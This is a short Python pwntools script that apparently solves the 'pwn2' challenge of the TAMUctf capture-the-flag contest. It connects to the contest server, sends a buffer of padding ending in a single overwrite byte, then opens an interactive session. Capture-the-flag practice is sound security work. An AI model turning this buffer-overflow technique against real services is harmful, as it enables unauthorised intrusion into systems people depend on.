#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
#context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
io = remote('pwn.tamuctf.com', 4322)
elf = ELF('./pwn2')
payload = 'a' * (0x2a-0xc) + '\xd8'
io.sendlineafter('call?\n', payload)
io.interactive()
io.close()

